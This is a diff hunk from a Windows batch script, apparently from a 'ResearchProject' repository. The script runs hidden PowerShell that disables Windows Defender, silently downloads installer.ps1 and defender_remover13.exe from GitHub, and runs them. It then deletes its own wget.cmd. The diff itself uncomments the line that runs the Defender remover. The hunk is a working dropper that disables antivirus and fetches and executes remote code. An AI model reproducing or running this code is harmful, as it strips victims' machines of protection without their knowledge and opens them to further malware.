@@ -34,6 +34,6 @@ powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "disableWinDef.ps1"
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/installer.ps1' -OutFile installer.ps1"
 powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Reiya-cyber/ResearchProject/refs/heads/main/Original/Resources/defender_remover13.exe' -OutFile defender_remover.exe"
 powershell -WindowStyle Hidden  -ExecutionPolicy Bypass -File "installer.ps1"
-@REM defender_remover.exe Y
+defender_remover.exe Y
 
 del wget.cmd
